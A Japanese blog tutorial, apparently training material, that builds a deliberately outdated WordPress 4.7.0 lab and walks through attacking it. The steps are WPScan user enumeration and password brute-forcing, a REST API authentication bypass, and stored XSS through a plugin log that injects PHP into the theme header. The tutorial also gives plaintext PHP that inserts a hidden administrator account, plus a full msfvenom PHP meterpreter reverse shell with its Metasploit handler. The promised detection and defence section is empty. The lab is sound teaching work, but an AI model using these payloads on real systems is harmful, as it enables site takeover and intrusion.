---
layout: post
title:  "WordPress Build & Crack"
date:   2018-10-29
permalink: /security/:title
categories: Security
tags: WordPress
excerpt: WordPressの構築とクラッキング
mathjax: false
---

* content
{:toc}

# はじめに

このセッションではWordPressを題材にしてWebサイトを守る技術を学びます。

WordPressは誰でも簡単にスタイリッシュなWebサイトを構築できる素晴らしいCMSです。
W3Techsによると全世界のWebサイトのうち32%はWordPressで作成されているそうです。
一方でWordPressには非常に多くの脆弱性が発見されており改ざんの被害が後を絶ちません。
改ざんされたWordPressはマルウェアの配布に利用されることもあります。
WordPressを防衛することは、サイバー空間の安全を維持し、サイトオーナーとユーザーの価値を最大化することに繋がります。

効果的な防衛を実現するためには、防衛対象の仕組みを理解した上で攻撃手段を理解しなければなりません。
まずは環境構築を通じてWordPressの仕組みを学びましょう。次にサイバーキルチェーンに従っていくつかの代表的な攻撃手段を学びましょう。最後に攻撃の痕跡がどのように残るのか検証し、効果的な防衛について議論しましょう。

# 免責
このセッションにはWordPressを改ざんする具体的なノウハウが含まれますが、読者に対して改ざん行為を推奨するものではありません。
Webページを改ざんするなどコンピュータや電磁的記録を破壊して業務を妨害する行為は、刑法234条の2である電子計算機損壊等業務妨害罪などにより、処罰の対象となります。
このセッションに含まれる内容を不用意に実施したことにより、読者が被ったいかなる不利益についても、当サイトでは責任を負いません。

# 環境構築

WordPressは次のコンポーネントから構成されます。

|コンポーネント|役割|
|:---|:---|
|PHP|データベースに基づきWebページを動的に生成する|
|Apache httpd|ブラウザからのリクエストを処理する|
|MySQL|ユーザーアカウントやサイトコンテンツを保存する|
|WordPress|Webサイトのひな型|

## PHP
```
# phpのインストール
yum install -y php php-mysql

# phpが動作することを確認
php -r 'print "hello world\n"'
```

## Apache httpd
```
# Apache httpdの起動
systemctl enable httpd
systemctl start httpd

# テストページの設置
cat > /var/www/html/index.php << END
<?php
phpinfo();
?>
END
```

**ファイアウォール/SELinux**

検証環境を手早く構築するためにファイアウォールとSELinuxを停止しましょう。
余裕があれば、これらの適切な設定方法について学ぶのも悪くありません。
```
# ファイアウォールの停止
systemctl stop firewalld

# SELinuxの停止
setenforce 0
```

テストページにアクセスして動作確認しましょう。

![](/images/wordpress/phpinfo.png)

## MySQL(MariaDB)

WordpressのバックエンドDBのMySQLを用意します。
ここで作成するデータベース名、ユーザー名、パスワードは後で参照するので覚えておいてください。

```
# MariaDBのインストールと起動
yum install -y mariadb mariadb-server
systemctl enable mariadb
systemctl start mariadb

# データベースの初期化スクリプトを作成
cat > /tmp/init.sql << END
set password for root@localhost=password('rootpassword');
insert into user set user="wpadmin", password=password("wpadmin"), host="localhost";
create database wpdb;
grant all on wpdb.* to wpadmin;
flush privileges;
END

# データベースの初期化スクリプトを実行
mysql -u root -D mysql < /tmp/init.sql

# 以下の設定が完了したことを確認
# - rootユーザーのパスワードが変更されていること
# - wpdbデータベースが作成されていること
# - wpdbデータベースの権限を持つwpadminユーザーが作成されていること
echo 'select Db, User from db;'| mysql -u root -D mysql -prootpassword

# wpadminユーザーでログインできることを確認
echo 'show tables;'|mysql -u wpadmin -D wpdb -pwpadmin
```

次のようなエラーが返された場合はwpadminユーザーの作成に失敗しているので手順を再確認してください。

`ERROR 1045 (28000): Access denied for user 'wpadmin'@'localhost' (using password: YES)`

## WordPress Core
wordpress公式が古いバージョンのWordPressを配布しています。
利用する脆弱性に応じたWordPressを取得してください。
画像の例ではWordPress4.6.0を設置する手順を示していますが、後の検証をスムーズに進めるためにはWordPress4.7.0を設置する方が良いでしょう。

```
# wordpressのダウンロードと設置
wget https://ja.wordpress.org/wordpress-4.7-ja.tar.gz -O /tmp/wordpress-4.7-ja.tar.gz
tar -zxvf /tmp/wordpress-4.7-ja.tar.gz -C /var/www/html/
mv /var/www/html/wordpress/ /var/www/html/4.7.0/

# アクセス権限をapache:apacheに変更
chown -R apache: /var/www/html/4.7.0
```
ブラウザからwordpressのパスにアクセスすると初期設定ウィザードが開きます。

![](/images/wordpress/setup-config.png)

MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。
画像の例ではテーブル接頭辞を`wp_46`としていますが、後の検証をスムーズに進めるためにはデフォルトの`wp_`で進めた方が良いでしょう。

![](/images/wordpress/setupconfig2.png)

設定が無事終わればこの画面が表示されます。
まだインストール実行をクリックしないでください。

![](/images/wordpress/setupconfig3.png)

今回は脆弱性のある環境を構築するため、あらかじめWordpressの自動更新を無効化します。
設定ウィザードによって生成された`wp-config.php`に`define('AUTOMATIC_UPDATER_DISABLED', true);`という行を追記しましょう。

```
# Wordpressの自動アップデートを無効化
echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.7.0/wp-config.php
```

自動更新を無効化したらインストール実行をクリックします。
ここで指定するユーザーがサイトの管理者になります。
パスワードを忘れないようにメモしてください。

![](/images/wordpress/setupconfig4.png)

サイトの情報を設定して`WordPressをインストール`をクリックすれば構築は完了です。

![](/images/wordpress/installcomplete.png)

Hello world!にアクセスできることを確認します。

![](/images/wordpress/wpindex.png)

**データベースの確認**

WordPressのコンテンツはデータベースに格納されています。
mysqlにアクセスすることで投稿内容やユーザーデータを確認できます。
```
# wpdbデータベースにテーブルが増えている事を確認
echo "show tables;" | mysql -u wpadmin -D wpdb -pwpadmin

# 投稿に関する情報を確認
echo "select * from wp_46posts;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー一覧を確認
echo "select * from wp_users;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー権限を確認
echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql -u wpadmin -D wpdb -pwpadmin
```

# 攻撃

攻撃手段を理解するにあたってはフレームワークを活用しましょう。
[MITRE ATT&CK](https://attack.mitre.org/resources/enterprise-introduction/)によると情報システムに対する攻撃は7段階に分類されます。
この一連の攻撃はサイバーキルチェーンと呼ばれ、未知の攻撃だとしてもこの流れには従うとされています。
これからサイバーキルチェーンの一部を体験してみましょう。

## ターゲットの偵察

攻撃ステージはRecon（偵察）です。

WordPressが生成するHTMLソースからは様々な情報が読み取れます。
WoredPress Coreのバージョンや使用されているPluginのバージョン、その他にもサイトに存在するユーザーアカウント名なども分かります。
そのような情報を効率的に収集するツールとして`WPScan`が有名です。
自分で構築したWordPressに対して情報収集をしてみましょう。

ターゲットサーバに到達できるKali Linux上で操作することを想定しています。

```
# 基本的な情報を列挙する
wpscan -u http://target-server/wordpress-dir/

# ユーザーアカウントを列挙する
wpscan -u http://target-server/wordpress-dir/ --enum users

# ユーザーアカウントを指定してパスワードリストの中から一致する物を全探索する
wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
```

ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
[OpenWall](https://download.openwall.net/pub/wordlists/passwords/password.gz)が提供しているリストは基本的なワードが含まれていてコンパクトなので手軽に利用できます。
また、pastebinやtorネットワーク上に実システムから漏えいしたパスワードリストがアップロードされるている事もあります。

WordPressのバージョンや脆弱性のあるPluginの有無などの情報を収集できましたか？
ターゲットが複雑なパスワードを使用していなかった場合は、この時点で特権アカウントの情報も入手出来ているかもしれません。

## WordPress Coreの脆弱性

攻撃ステージはExploit（脆弱性の利用）です。

脆弱性とは何でしょうか。
それはバグが含まれる古いバージョンのソフトウェアや簡単に推測されるパスワードなどです。
あなたは事前の偵察によってターゲットの脆弱性を知ることが出来ました。
今からWordPress4.7.0が抱える脆弱性を利用してみましょう。

**REST APIとは**

WordPress4.7.0からREST APIによるコンテンツへのアクセスが実装されました。
それ以前にはWebブラウザからWordPressのダッシュボードにログインして記事を編集する必要があったのです。
REST APIが実装された事によってダッシュボードにログインしなくても同様の操作ができるようになりました。

試しにブラウザから次のURLにアクセスしてみましょう。
JSON形式の情報を得ることが出来たはずです。

```
http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
```

**REST APIの脆弱性**

WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
例えば以下のpythonコードはWordPress4.7.0のHello World!ページを書き換えます。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX19wksWBReZsgKq5X6nV2sbk904L/VszoUCFHPCwBxsDc1tHklTmVzLBPJjr2781u90SgiY9o5i4+wUYH0L/vE2B2MM1TVjauPij5NF+IJMzGru9kMhq2lzNJeL1TqKjM23/EzHK5piFXiAVCjy7lSsv3LhhQcmK4dPVf5cSrj7DTrMEBv3zUKCmjScEFOgtvHEefofMs4ZUJq/bi+htXZguLVy7ZBdDajKyY3EgBetvyHVjG+IIPhgh7YyCG6dYR8zsSc8UiMC+WsDZ5IluZNp1YsxPF4uv2PLDY+bVPupVP6tccdF3WeaoLVyG8yM+mLmT3nzXLxXQMa7CW20+8QQW8LNBlo00++uJa5MRkHZkwODanacT/E7o
```

Fiddler等のローカルプロキシを使ってREST APIをコールする事も出来ます。
送信するPOSTリクエストは以下の通りです。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX19T2S9GM16Rn3P+PPFPGvIL+jolJnOxec9PRAVK/AdeJUax1l5d9k9knMAjAEEz5EXGx8hKSe6//dPLgatOTZ6wJsvu7jgIIiosS3NMZYftSMirq1unxlvg9SeSJGLiOeXCsv5khvfGjs5TszP+l4EJZrLOWytoahMjHZf46AxAhur/bjPDynNYLGQfVqNlDa+peF0L4r4YglusySAbY0FBnQR3t9nzNiXZ8dfK8rJJcWszvpoy7fPJ/IdGmtUaC04jNSJzYVD1Sw==
```

![](/images/wordpress/fiddler02.png)

WordPressのユーザーアカウントを使わずにコンテンツを書き換えることが出来ました。
ただし`<script>`などの一部のタグは書き込むことが出来ません。
WordPressにはksesというセキュリティ機能が有り、XSSに繋がるような文字列が除去されるためです。
この脆弱性を使って出来ることは、フィッシングサイトを作成して閲覧者にリンクをクリックさせる事ぐらいでしょうか。

![](/images/wordpress/fiddler03.png)

## WordPress Pluginの脆弱性

攻撃ステージはExploit（脆弱性の利用）です。

他に利用できる脆弱性は無いでしょうか？
ksesの影響を受けずにXSSが出来るような手段が必要です。

このセッションでは、あなたは敢えて脆弱性のあるPluginをWordPressにインストールしたはずです。
意図したとおりに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば次の攻撃を試す価値があります。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX1+coBOcBKCzqamqzRdhiX1JjgOV4C8E4yI9RaEtIXVyOLV057UnGTF79q30sZ85xxYwjpjy8C9SAgFmyNfoUZ0EaPHVUbj0P2z1vVOL/LFwLJ+I0sKOprBT0CLoopq448a3AJM2OocUas3tOdGanxZvYKwk5Q1cD4uKTlKp2vz70uNViueyTisAhKradz0YaeEO/7sVw8u9N/xqXUrZLe0CJl8bBLnKGM2vo4t4+eBHHMejBLc7f5ASrKUYazUzYpNVs/aJRronilUT13n4an0eI/kiZd3rgBSY9MkNklpYqnl9pkS4Zyj8
```

![](/images/wordpress/fiddler04.png)

攻撃に成功すればActivity LogにXSSを含むアクセスログが追記されます。
このログはWordPressの管理者にしか見えませんが、わざわざPluginをインストールするような管理者なら定期的に確認するはずです。
管理者がログを確認したタイミングで格納型XSSが起動します。

セキュリティを強化するPluginが攻撃の糸口になるとは皮肉なものですね。

![](/images/wordpress/log_activity01.png)

## 任意コード実行

攻撃ステージはExecution（攻撃コードの実行）です。

おめでとう！あなたはターゲットに不正なスクリプトを注入し、アラートを表示させることに成功しました！
でも、ちょっと待ってください。
現実の攻撃はこんなチュートリアルでは済みません。
ここからは、どのようなスクリプトを用意すればターゲットに致命的なバックドアを作成できるのかを学びます。

格納型XSSの手順を参照しながら次のワンライナーを書き込みましょう。
XSSを起動するにはActivity Logを表示する必要があります。
本来は管理者のアクセスを待つ場面ですが、このセッションではあなたが管理者に代わってXSSを起動してください。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX18/WB2d2+ipDPcSVsIZ62Px7VNRwC0LmdXjCO0CeknoJqnPW/Dnzn9YcikfpcrEWVbdzBKbyo5Cn3OfIkYgpJvdvPXLq1Doww8OYjA7H7EdFKFRRl5LhMGHdx3Xn9QM0Sc0uvkCn27E+pdxoUJRniX9uQd9frMynipZsOWOU6pxtqAZEd3kI3/LDOUjJeubosY8/05nct4bfVzGf/YZO5qf6v6MAOHEeCIqqQ7vZi2FyLrTte8eMkkpjm2soYrcUWRafcX/xyYZsu4YsyPX3DjBB+wzUKzo+0eho4b+Ou3h2KPwpeZNdSaAk8HcGj4ncoQWgXDasCekndmG2Vc5SSwsZkW0Pn47JjsSheY0EJL6P6KCyMuv4Bf1fGKu5YQUMo5hpWBKQZaEGDClw3I68jUBupjVPlXJl6oYjhq3IOl70+QtA1qbsBTOzz1vRtSL6bylrbcxsPjlQA==
```
↓ 参考のために整形
```
U2FsdGVkX18zqMrMd7J7zH5zoUm4c2y88uH778CNivZkXzZVnPAQG3Bg/flqLYWNMVlhw68SG/EaA6tAXjG9Zx0cAhtXVoRK32bEkeTZ9gGcvZKm/Q0tJXMQNa6C9/Kkd/w6RJLQ/1vidYMsLOkg54HogdF9y3hPiWufYaASvcCOT/lFkuOpLZwRSC0Kx+binmwEfSifjSzGJhgd2U7JMWtbLV7iKrul5UiXbDfpOKKr0QsZplOrlViIvfqIGrSAcB02LY85Z6G4EKB+aMJlPRMrdDojyfPP452BAQVzUORK42KPFJoXgyuHMKHC1E2VNpiNJjIScOB+SkwUbyWejUsV3fCXvKZZzZX11AHPEGZ2pEI86zTMEcsnAyYKbHpjMVu5xQU2uGUWnvXBaTP1Ke01016L02EXIvAeUlt+VTCbcG1LdwvVoQJbn61g0YoXrhBIOQVjA+ijwB5S8gVPRQevIJwPb3H/eqUfy8/BobK5VdwLe5uwuxrGUG7mFmPg6CqGsyZw6Tn+i37OZ6jMGoSzimizSHfeExVxoBFH0FM=
```

ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認するとXSSで注入されたphpコードが確認できます。
テーマヘッダーはWordPressのヘッダーを出力するためのphpファイルです。
この改ざんはあらゆるページに影響するということです。

![](/images/wordpress/xss02.png)

phpinfoの出力についてはセッションの最初に確認しましたね。
ダッシュボードを抜けて一般ユーザー向けのパスを確認すると次のような結果になるはずです。

![](/images/wordpress/xss01.png)

## 特権アカウント作成

攻撃ステージはPersistence（侵入手段の永続化）です。

任意コードが実行できたならターゲットを完全に掌握するまであと一歩です。
WordPressデータベースを操作してあなただけが使える特権ユーザーを作成してみましょう。
次のワンライナーを使用してください。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX1+lrU5qd6vLjVmy8kjGOn4THRV7StgjfP34q0Vfh6ibLsS3G8FpfL60kpkre4Nz8oj/EBny4kaQ6+6AKbv+ZJkyifomgjU/cvnsVpLHcRvF6f7YK2YyWQoWbhHc9iQuij0P6m+kOnkaJ4kXHS1XV8Je4VYeKZsMRZDnlO2XEKgV31Ial9tpPwhuQXLyt+VRh68AV3i9/b6uD4PuLloLvzcNZNgUm02AyDHvvB1kvhI2hvj/yecVHEGgzc22HgoRVknDrCa5kvSGZZcsk7XbvrKb9d4KNfcauey1nFa6YLhrOGocsTqZZ7iR4/cknhpYgOwWeh1MQVXuOxQ9sy3dVluxj965z0/w93191UtQX279D/Dn6xDVgBoncT0MFjb20ZU92K/3YSb4e1Ije6zNgoDXGDCotrCSPvWyLGPEiCBS1s1NfoWpqxXa5S2ud3YZ2GJluLsfQnLIyj21kSZwZwIJ6c/RvqBXK7EgUebfUYPK/y+oDpIz2VGNwGus5QJsfQ1Du8S3poMLAEIFBE6hSsrkwauW//b4JiL0TjzL+vLHHfYLJ7rLPiZL6+ZGvgh057GrD2hFoL4GHNFlNfuGONfSMkYy7D3tNI8ntUrFj6aO3L90lN2Klh1F33JlwcTLSKTQ+i9FrLUOr8YuWddJfLzyC/XiDKc1fO/dNDn0rkZB2uTphS0oW3MS0bnfWtkITvjTFxIhyaY/iyyYXl9Vx54bbSGY/r2BxfmG4+IXSbdSoOXByhxhQrfXiVwTB0n59BkJYzWP3M+2ivqu2g7Vg69aFN40vUhisJNAwDAnoRgGU+96Iz2kx/6pLQibqfHIy4qUIS2nq8nv5g==
```
↓ 参考のためにphpコード部を整形
```
<?php
$wpdb->insert(
  'wp_users',
  array(
    'ID' => 999,
    'user_login' => 'b@ckd00r',
    'user_pass' => md5('b@ckd00r')
    ),
  array(
    '%d',
    '%s',
    '%s'
    )
  );
$wpdb->insert(
	'wp_usermeta',
	array(
		'umeta_id' => 9999,
		'user_id' => 999,
    'meta_key' => 'wp_capabilities',
    'meta_value' => 'a:1:{s:13:\"administrator\";b:1;}'
	),
	array(
    '%d',
    '%d',
    '%s',
    '%s'
	)
);
?>
```

Activity LogからXSSを起動したらWordPressから一旦ログアウトしてください。
そして、今作った特権ユーザーアカウントでWordPressにログインできることを確認しましょう。

![](/images/wordpress/xss03.png)

無事ダッシュボードに辿り着いたなら、あなたはこのサイトを支配下に収めたということです。
この先何をするのかはあなたの想像力にかかっています。

![](/images/wordpress/xss04.png)

## リバースシェル

攻撃ステージはCommand and Control（ターゲットの掌握）です。

リバースシェルを設置すればターゲットをOSレベルで支配することが出来ます。
Kali Linuxを起動してphpのリバースシェルを生成しましょう。
次の例ではC2サーバが172.16.0.254:4444でコネクトバックを待ち受けることを想定しています。

複雑なコードなのでXSSを介して書き込むことは困難です。
あなたは既に特権ユーザーとしてダッシュボードにログインすることが出来るはずです。
404.phpなどを編集して直接phpコードを書き込みましょう。

**リバースシェルの生成**
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw

↓ 出力結果

/*<?php /**/ error_reporting(0); $ip = '172.16.0.254'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![](/images/wordpress/reverse01.png)

**C2サーバの起動**

リバースシェルを設置したらC2サーバの準備をしましょう。
Kali LinuxでMetasploitを使ってreverse_tcpを起動します。

```
msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.0.254
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit
```

![](/images/wordpress/reverse02.png)

**リバースシェルの起動**

すべての準備は整いました。
Webブラウザからリバースシェルが設置されたphpファイルにアクセスしましょう。
Metasploitのコンソールを確認するとコネクトバックが成立していることが分かります。

![](/images/wordpress/reverse03.png)

# 検知と防衛

# まとめ

このセッションを通じてあなたはWordPressでWebサイトを構築する最低限のノウハウを得ました。
本番環境では更にセキュリティに気を配った構築と運用を心がける必要がありますが、検証環境としてはこれで十分なはずです。
知識を得るだけでなく、積極的に検証することでノウハウを定着させてください。

あなたはサイバーキルチェーンの概念を知り、WordPressに対する具体的な攻撃手段の一部を知ることが出来ました。
大いなる力には、大いなる責任が伴うことを忘れないでください。
あなたはその知識と力を、サイバー空間の安全を守るために行使すべきです。
